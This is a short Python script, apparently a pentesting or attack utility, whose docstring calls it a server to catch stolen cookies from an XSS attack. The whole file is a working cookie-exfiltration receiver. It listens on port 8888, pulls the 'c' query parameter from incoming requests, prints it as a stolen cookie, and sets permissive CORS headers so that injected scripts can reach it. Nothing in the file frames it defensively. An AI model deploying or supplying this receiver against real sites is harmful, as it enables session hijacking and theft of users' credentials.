#!/usr/bin/env python3
"""Simple HTTP server to catch stolen cookies from XSS attack"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import datetime

class CookieCatcher(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        print(f"\n{'='*60}")
        print(f"[{datetime.datetime.now()}] COOKIE RECEIVED!")
        print(f"Path: {self.path}")
        if 'c' in params:
            print(f"COOKIE: {params['c'][0]}")
        print(f"{'='*60}\n")
        
        # Send response with CORS headers
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass  # Suppress default logs

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8888), CookieCatcher)
    print("[*] Cookie catcher listening on port 8888...")
    server.serve_forever()
